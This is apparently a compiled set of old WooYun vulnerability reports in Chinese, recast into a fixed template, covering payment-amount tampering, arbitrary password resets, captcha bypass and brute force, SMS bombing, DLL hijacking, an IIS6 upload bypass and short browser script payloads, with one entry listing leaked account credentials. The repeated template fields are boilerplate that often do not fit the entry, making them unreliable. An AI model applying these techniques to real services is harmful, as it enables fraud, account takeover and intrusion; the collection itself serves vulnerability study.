**厂商**: 某核电建设公司 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**:8088/Login.aspx 无验证码可以爆破

**POC**: 注入

**绕过**: 直接利用

**修复**: 修改
---

---
### [wooyun-2015-0125736] KesionIMalv2.5逻辑漏洞（DEMO演示）
**厂商**: kesion.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: demo地址：https://example.com/[已脱敏]

**POC**: 如上

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0113389] 鼎新影院售票系统逻辑缺陷导致空手套票轻松约女神免费看电影（万达/星美/中影城中招）
**厂商**: yinghezhong.com | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 组队三人看电影，已买票。购票短信取双份票后确认下是这个系统三人组中@少妇杀手 说 试试并发取票看能不能吐双份的票出来！ @柠檬 说 赶紧试试，说不准真有。然后我跟他们用两台取票机，输完序列号和验票码同时按 出票 按钮

**POC**: bingo！都知道的 检票员最多也就看看影票日期 ....票在手跟我走！9排6座没上照原因是 我稍稍点快了一点取票按钮，结果只有7和8座吐了双份）看完电影，我负责放风，@少妇杀手 @柠檬 看了下三人组由来 电影 <我是谁：没有绝对安全的系统> 人格"分裂"出的。如果只买一张票用多台机器同时点取票...后果你猜

**绕过**: 直接利用

**修复**: 1、并发加锁；上文提到的检票员会看影票时间其实很少去看的，大多数是瞄一眼就过。这样一来尽管不是当天有效票，那我能直接复印以往旧票来绕过...所以2、扫码检票  还是要的。
---

---
### [wooyun-2016-0172600] 超好玩主站设计缺陷重置任意密码（完全是摆设）
**厂商**: 深圳英鹏玩客公司 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 理论是400万+用户但是绑定邮箱的不知道多少需要邮箱绑定用户以这个漏洞的id为测试目标：WooYun: 超好玩主站设计逻辑缺陷重置任意账号密码来找回密码处，选择邮箱https://example.com/[已脱敏] 123123，我把它密码改为123456上面验证码随便填，完全是个摆设点击重置，直接登入了这个是我的urlhttps://example.com/[已脱敏] 123456已经登入了

**POC**: 邮箱注册用户

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-083953] 社会科学文献出版社接口设计不当导致验证码绕过爆破或撞库
**厂商**: ssap.com.cn | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 事情发生那今年的11月。。。。。那是一个寒冷的日子。。。在我无聊没事找书看的时候在茫茫网络中一眼看到了你。，。。。我就好奇点进去看了~习惯性在登陆口抓了个包~分析发现。。。验证码是有了。但是是在本地可以修改的。参数是在Cookie里面的ImageV=而且没有限制。。那我就开始爆破咯~ssap.com.cn

**POC**: 一部分账号做证明hmc	123456test	123456www	123456qiao	123456TEST	123456hobby	123456www	123456www	123456sister	123456test	123456test	123456vicki	123456brina	123456test	123456wwwww	123456huang	123456kashi	123456vicki	123456brina	123456duncan	123456sunny	123456empty	123456sweet	123456sunny	123456darker	123456sun

**绕过**: 直接利用

**修复**: 1.https验证2.加强验证码机制3.你们比我专业
---

---
### [wooyun-2013-028186] 某互联网公司某分站短信验证轰炸
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.url: 9.163.com2.上图我们可以看到，发送验证码处无任何验证，我们使用Burp抓包。3.发送至Repeater，修改手机号码，点击Go。4.可以无限制的发送，只要服务器相应速度够快。

**POC**: 1.url: 9.163.com2.上图我们可以看到，发送验证码处无任何验证，我们使用Burp抓包。3.发送至Repeater，修改手机号码，点击Go。4.可以无限制的发送，只要服务器相应速度够快。

**绕过**: 直接利用

**修复**: 1.加验证码 限制短信间隔时间和接收次数
---

---
### [wooyun-2012-08699] 360手机卫士直接绕过360密码屏锁
**厂商**: 某安全厂商 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 第一步：第二步：第三步：第四步：已经可以修改掉密码锁。或者：在下拉菜单栏进行其它操作。收工！

**POC**: 第一步：第二步：第三步：第四步：已经可以修改掉密码锁。或者：在下拉菜单栏进行其它操作。收工！

**绕过**: 直接利用

**修复**: 你懂我不懂。
---

---
### [wooyun-2015-0114101] 中国日报某站支付漏洞
**厂商**: 中国日报网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这个站！https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: ~~
---

---
### [wooyun-2013-018821] 利用恶意二维码攻击UC浏览器可导致崩溃
**厂商**: UC Mobile | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 扫描可导致UC浏览器重复刷新。其它功能全不可用，并崩溃

**POC**: 扫一下试试就知道了  崩溃页面是不停刷新 没法截图证明..

**绕过**: 直接利用

**修复**: 完善一下呗~
---

---
### [wooyun-2015-0125000] E人E某处支付漏洞
**厂商**: eben.cn | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、漏洞地址：https://example.com/[已脱敏] 改成33、价格变成了34、第二个选择某电商平台支付，重复上一个过程，会便宜一千块 - -

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-012749] TP-Link官方商城支付漏洞
**厂商**: 深圳普联技术有限公司 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 注册购买路由交换设备后到购物车支付，比如用某电商平台支付可以任意篡改交易金额，漏洞等级高。

**POC**: 图一图二图三图四图五图六图七图八图九图⑩图十一

**绕过**: 直接利用

**修复**: 截图中可以看到交易过程中加了签名，但是好像没有利用起来！利用起来吧~ 另外不要直接post交易金额啦。=======================================================另外我一分钱不要了哈，买的路由器就不用联系我发货了 - -，剑心mm求邀请码啊。
---

---
### [wooyun-2013-046446] 360隐私保险箱加密过的文件照样看
**厂商**: 某安全厂商 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 今天借朋友手机玩，知道他手机里有黄图，哥非常想要，于是找啊找，找了半天没找到，就在无望之际，哥看到了“360隐私保险箱”于是..各种绕过..然后进文件夹管理器，找目录因为目录是img的，我想想看看，里面是不是图片。但结果不是。于是我本着好奇心去试试，改了名字，在后面加了个.jpg然后奇迹出现了....

**POC**: 看上面的图

**绕过**: 过滤绕过

**修复**: 原来我的硬盘里有500G AV。有一天，我决定戒黄，于是我把他们都删了。然后....我学会了数据恢复...后来我成为了一名数据恢复专家
---

---
### [wooyun-2016-0169120] 福建师范大学逻辑缺陷导致全校老师的密码可任意重置(登录密码任意修改)
**厂商**: 福建师范大学 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 福建师范大学逻辑缺陷导致全校老师的密码可任意重置(登录密码任意修改)，问题系统url：http://**.**.**.**/index.aspx问题功能：忘记密码1、在统一身份认证系统中，存在逻辑缺陷，短信验证码可见：2、可通过老师姓名直接重置密码：3、重置密码成功

**POC**: 如上

**绕过**: 直接利用

**修复**: 。。。。。。。。。。
---

---
### [wooyun-2015-0121598] 某运营商某业务支付逻辑漏洞
**厂商**: 某运营商 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 众所周知，单机手机游戏也是可以充值的。而充值时会通过第三方的方式收费，比如某运营商的扣费短信发送默认。以植物大战僵尸2为例我在某手机助手里下载了这款应用，然后使用了某手机管理的权限管理功能（当然任何手机管家都可以做到这点），将短信发送功能设置为提示（直接设置为禁止就好，这里是为了方便演示）然后进入游戏充值这里选择禁止成功。。。。看第一张图就知道我是几点测试的。一直到现在几个小时了我没收到扣费短信，话费也没有减少。然后我又测试了另一款应用，appstore付费榜第一的格斗游戏，当然是安卓移植版。火柴人联盟。这时我的钻石是初始的100，选择2¥同样选择禁止这时再看，钻石已经变为120。同样没有扣费短信，话费也没有任何变化另附支付时需联网

**POC**: 如上

**绕过**: 直接利用

**修复**: 不造
---

---
### [wooyun-2015-0123699] 某搜索引擎卫士全局注入模块失效漏洞
**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某搜索引擎卫士开启电脑专家功能后，AppInit_DLLs会添加上C:\PROGRA~1\COMMON~1\Baidu\BDWEBA~1\20320~1.0\BDEWebAdapterFrame.dll这个路径名，作为全局注入的模块。但某搜索引擎卫士没有对这个注册表键值进行保护及修复，很容易被篡改掉，导致电脑专家功能失效。

**POC**: LPCTSTR p = _T("");DWORD dwSet = SHSetValue(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows"),_T("AppInit_DLLs"), REG_SZ, (LPCVOID)p, (_tcslen(p) + 1)*sizeof(TCHAR));

**绕过**: 直接利用

**修复**: 1.增加对AppInit_DLLs键值的保护逻辑2.使用其他全局注入的技术方案
---

---
### [wooyun-2015-0108697] 某运营商某市分站支付逻辑漏洞
**厂商**: 某运营商 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] 存在低价购买高价靓号的问题（50入网费+0元号费购买6000元顶级号码）

**POC**: 审查元素找到系统分配给号码的phoneID找个最低级的号码 增加到购物车 截包替换为刚才找到的号码和号码ID提交订单填写各种信息后提交就是这样...穷逼...就不支付了

**绕过**: 直接利用

**修复**: 你们比我更专业
---

---
### [wooyun-2014-087890] ecshop一处验证码绕过逻辑漏洞
**厂商**: ShopEx | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 虽然验证码进行了加密，但是逻辑上还有点问题问题出在..\includes\cls_captcha.php通过验证函数可以看到直接返回，并没有对验证失败进行处理function check_word($word){$recorded = isset($_SESSION[$this->session_word]) ? base64_decode($_SESSION[$this->session_word]) : '';$given    = $this->encrypts_word(strtoupper($word)); //MD5加密处理return (preg_match("/$given/", $recorded)); //验证规则}也就是说如果登陆失败的时候没有对验证码SESSION置空的话，就可以在这次请求中反复尝试进行破解。下面代码可以看到并没有对验证错误的时候进行处理..\ecs

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 通过以上代码，可以看出是验证码session没有置空导致的，每次登陆都session(null)就行了;
---

---
### [wooyun-2015-0160679] 褚橙官网一处设计逻辑错误
**厂商**: 褚橙 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 褚橙官网存在支付漏洞  经过测试可以0.1元支付

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0129278] P2P安全之e微贷逻辑缺陷可任意账号注册及密码重置
**厂商**: 圳市前海泰丰融通金融服务有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 13888888888为例 账号注册  密码重置 验证码四位数字 30min有效  众多平台可爆破主站可撞库

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-020332] 爱丽网某逻辑漏洞可导致他人手机号码被强制修改
**厂商**: aili.com | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入, 认证接口, 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题地点：爱丽团购。存在问题：1.用户绑定任意手机号。（爆破，不严重）2.在用户A登录的情况下强制B用户绑定手机号为A的手机。由于爱丽网密码找回在白帽子们的冲击下还是选择了邮箱找回，所以通过手机重置密码的愿望落空。邮箱的code码算法暂时没猜解出来，就挖了下这两个小问题。1.burp下绑定任意手机号。在绑定手机,获取验证码后得知,验证码为6位纯数字.然后爆破参数.瞎弄的手机号这个缺陷不严重,但是最好还是修复,加上限制次数.下面这个问题,就有点了,强制绑定别人的手机号为我们的,经测试会影响如到,如果此会员设定了默认收货人和地址,会影响到默认收货人的号码.步骤:1.登录自己的帐号,绑定一个自己的手机号,会在后台看到自己已经绑定的手机.2.新增手机绑定.在获取验证码后,填写手机验证码时,抓包修改UID。然后提交。3.会发现提示绑定成功。4.然后发现自己账户原本绑定的手机号“被消失”。5.登录UI

**POC**: 见详细说明。

**绕过**: 直接利用

**修复**: 绑定手机验证码次数做限制，并且对绑定时候的UID进行比对，防止越权。
---

---
### [wooyun-2013-024989] 突破安全狗上传后门
**厂商**: 安全狗 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在iis6.0中解析漏洞就不用多说了，但是遇到安全狗大家基本就没折了吧，我就遇到了。

**POC**: 但是可以截断突破。iis6.0本身是可以解析的但是遇到这流氓安全狗拦截，很蛋疼吧。如果iis6.0文件名是;yinin.asp;yinyin.jpg那么它是直接截断了呢还是解析了呢？很淡定的告诉你他解析了。iis6.0会截断之后重新解析;之后的文件！而安全狗的弱智判断就不会有任何的禁用的！​

**绕过**: 直接利用

**修复**: 加强网站解析
---

---
### [wooyun-2013-036592] 某云盘多处DLL劫持（包括win目录DLL）
**厂商**: 某安全厂商 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 360WangPan.exe运行时会加载四个不存在的DLL文件分别为：dwmapi.dll，360WangPanCHS.dll，360WangPanCHT.dll，360WangPanLOC.dll假如某云盘安装在C盘劫持路径为：C:\Program Files\360\360WangPan\那么360WangPanCHS.dll，360WangPanCHT.dll，360WangPanLOC.dll这三个DLL放在该目录下，可在360WangPan.exe运行时同时加载。同时某云盘运行前还会加载系统目录下不存在的DLL文件C:\windows\system32\dwmapi.dll这四个DLL可以为自制的任意恶意dll。此方法可用于劫持启动木马病毒

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 360真心不错。。你们懂的！
---

---
### [wooyun-2015-0105985] 无视主动防御利用多处缺陷使得LBE安全崩溃退出
**厂商**: lbesec.com | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 作为一款安全应用自身安全性还是很重要的，经测试，LBE安卓最新版存在多处本地服务，在开启主动防御的情况可使得LBE安全大师无限崩溃;（测试时看到LBE有多个进程，在崩溃后一段时间会自动重启，但其实只要写个循环就行了，崩溃比重启快多了~~）因为是漏洞，所以根本不需要关注啥主动防御，存在问题的组件有：com.lbe.security.ui.phone2.PhoneMainActivitycom.lbe.security.ui.notificationmanager.NotificationManagerActivitycom.lbe.security.ui.tips.TipsWebActivitycom.lbe.security.ui.privacy.HipsMainActivitycom.lbe.security.ui.home.NewHomeActivitycom.lbe.security

**POC**: 相关crash的logcat:java.lang.RuntimeException: Unable to start activityComponentInfo{com.lbe.security/com.lbe.security.ui.optimize.WakePathActivity}: java.lang.RuntimeException:Parcelable encounteredClassNotFoundException readinga Serializable object (name = com.example.myapp.MyActivity$SerializableObje

**绕过**: 直接利用

**修复**: 严格校验接受数据的输入，如空指针，畸形数据，强制数据类型转换等异常情况的判断。
---

---
### [wooyun-2013-044701] Fuzzing之#某旅游平台旅行网某中心存在弱口令
**厂商**: 某旅游平台旅行网 | **年份**: 2013 | **类型**: 后台弱口令

**元思考**: 触发信号: 认证接口

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 此测试时针对wordpress的，大家都知道Wordpress在核心代码安全系数很高，而在逻辑设计上，却有很多问题。遍历用户名：https://example.com/[已脱敏]

**POC**: 操作后台数据，留后门什么的都没动，后台数据没做任何操作，谢谢。然后，就是继续收集信息咯，各种个人资料收集中......期待续集......还个问题，这个wordpress是3.3.1的，好像3.3.1的wordpress有几个漏洞的，没测试，管理可以升级了。

**绕过**: 直接利用

**修复**: # 后台管理路口加IP限制。# 登录接口加入限制。# 提高员工的安全意识，这才是王道。
---

---
### [wooyun-2013-016895] Safari location污染漏洞
**厂商**: Apple | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: safari在打开带有username/password的http url的时候会将账户密码保留在地址中,由于safari在获取location值的时候会将url中的username部分进行解码,这样我们就可以通过控制username部分污染后面部分.

**POC**: safari访问https://example.com/[已脱敏]'https://example.com/[已脱敏]')</script>

**绕过**: 直接利用

**修复**: username/password部分不进行解码.
---

---
### [wooyun-2012-010267] 铁血科技又一支付漏洞可任意充值各种。
**厂商**: 北京铁血科技 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 充值金额：	100元 修改为1.GET方式提交的。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 服务端验证算法100=1000 1=10 10倍算法
---

---
### [wooyun-2014-071884] vasee活动网验证缺陷(密码修改逻辑漏洞)
**厂商**: 北京前沿同创科技有限公司 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 登陆处 选择忘记密码，填上邮箱，邮箱验证为id flag email data 三个选项均为32位MD5加密，将发送的email地址改为想要的人邮箱，可以修改成功。请厂家自测一下。

**POC**: 修改邮箱 32位md5加密后正常来说修改后的密码，第一个邮箱或者第二个邮箱2个可以登录一个，但是测试结果发现两个邮箱都不能登录，敢为厂商是哪个账号修改成功了，那就说明在提交给服务端的程序数据在判断的时候逻辑判断错误。

**绕过**: 直接利用

**修复**: 验证发送连接改为发杂加密方式，单纯MD5容易破解。
---

---
### [wooyun-2013-020913] 新洁艺网吧管理系统绕过漏洞，可直接调出任务管理器
**厂商**: 上海新浩艺软件有限公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这网吧双系统一个万象的刷新可以看到桌面，一个直接来任务管理器了正常情况前台刷身份证-开机-输入身份证登陆。这个不需要输入身份证，调出任务管理器，任务管理器出来了电脑就可以做某些事情了。

**POC**: 任务管理器能做什么这就能做什么，感觉像那些自助终端一样。能有1rank就满足了

**绕过**: 直接利用

**修复**: 你们比我专业，毕竟天国网吧大部分用你们的系统
---

---
### [wooyun-2012-07997] 百脑汇商城支付漏洞
**厂商**: 百脑汇 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 后续操作未敢进行测试，但危害不言自明...

**POC**: 后续操作未敢进行测试，但危害不言自明...

**绕过**: 直接利用

**修复**: 生成时订单检查商品数量是否合理....
---

---
### [wooyun-2014-051859] 傲游浏览器4.3.0.100 表单请求伪造网站漏洞（可钓鱼）
**厂商**: 傲游 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 浏览器的广告过滤没有过滤带target的表单弹窗，而且在内容加载完成之前就显示了地址，可以参考chrome的做法--页面没有触发下载完成事件前有任何改动都应该将页面地址栏置为about:blank或者类似firefox的做法--弹窗时页面没加载完之前地址一律显示about:blank，只在标题栏上显示地址，加载完之后再替换

**POC**: <script>var k=1;window.onblur=s();document.getElementById("xxx").submit();function s(){if(k>1){window.open("javascript:document.write(3)","lll");}k++;}function s2(){window.open("javascript:document.write(3)","lll");window.onblur=function(){};}</script><body><form id="xxx" action="https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0146975] 富友收件宝某处逻辑漏洞可导致大量商户信息泄漏（成功一堆）
**厂商**: 上海富友金融网络技术有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题出在某互联网公司端的 富有收货宝点击商户服务-商户绑定/解绑跳转到登陆页面 发现是有验证码的但是验证码存在逻辑漏洞 可绕过首先抓包POST /fubox/bind/manager?uuid=34d12c04-abc9-4eac-bd1c-1929399c10d9 HTTP/1.1Host: sjbwx.fuiou.comAccept: */*X-Requested-With: XMLHttpRequestAccept-Encoding: gzip, deflateAccept-Language: zh-cnContent-Type: application/x-www-form-urlencodedOrigin: https://example.com/[已脱敏] 50Connection: closeUser-Agent: Mozilla/5.0 (iPhone; C

**POC**: 成功绑定

**绕过**: 过滤绕过

**修复**: 修改逻辑
---

---
### [wooyun-2015-0116661] 金山毒霸的一个逻辑漏可绕过主防
**厂商**: 金山毒霸 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 发送WM_QUIT消息给窗口名为"金山毒霸"的窗口.后果是:1打开金山毒霸主界面的情况下.获得WM_QUIT消息.A金山毒霸失去响应.B金山毒霸完全退出.C其主动防御彻底失效.用户可以运行非法程序.2没有打开金山毒霸主界面的情况下(最小化).获得WM_QUIT消息.A用户右键查杀病毒失效.B金山托盘区图标不退出的前提下,无法通过托盘区打开主界面.C用户无法通过重新启动金山毒霸打开其界面进行查杀.

**POC**: 可能原因:未对消息"WM_QUIT"合理处理.导致金山毒霸接收到该消息后开始退出,但是其保护机制在退出的某个阶段阻止了这个过程.致使:既不能退出,又不能恢复原来正常运行状态.例如:它的防止进程重复启动的进制已经退出了.如下图:

**绕过**: 直接利用

**修复**: 相信金山反病毒团队能够对这个漏洞提出非常优秀的解决方案.因为对毒霸的机制不是很了解.所以就不献丑了.
---

---
### [wooyun-2016-0180575] 华图网校APP缺陷打包
**厂商**: 华图教育 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] 区域*****56789QWEQWEEWQ*****Three_Des_IV = "01234567"def Three_DesEncrypt(str): k = triple_des(Three_Des_Key.upper(), ECB, Three_Des_IV, p

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 取消回显。APP加固，不打印日志
---

---
### [wooyun-2013-022816] 新网0.1元注册域名
**厂商**: 新网华通信息技术有限公司 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在新网选好域名，结账原来的价格是399元，下一步，填写域名信息选择填写其他DNS，这一步很关键接下来付款将“https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们更专业，求礼物
---

---
### [wooyun-2015-0116360] 天地行某业务支付逻辑漏洞(0元自由行)
**厂商**: 真旅网集团 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: store.tdxinfo.com注册用户！登陆！选择天地行！找一个预定一下！点击提交订单的时候抓包！然后只修改一个参数！将totalprice修改为0.01！这里也许是四舍五入，然后就成了0元了！我们选择某电商平台支付(选什么都一样)！

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-010307] 我也来挖个铁血的支付漏洞
**厂商**: 北京铁血科技 | **年份**: 2012 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] 铁血游戏充值漏洞

**POC**: 一元钱等于10金币，不过改了单价后就变成1元等于100元了，这个原理我还真没弄懂。改了下JS发现好像没用啊，不管了，就这样吧。

**绕过**: 直接利用

**修复**: 一元钱等于10金币，不过改了单价后就变成1元等于100元了，这个原理我还真没弄懂。改了下JS发现好像没用啊，不管了，就这样吧。
---

---
### [wooyun-2012-07495] 某安全厂商某平台短信轰炸漏洞
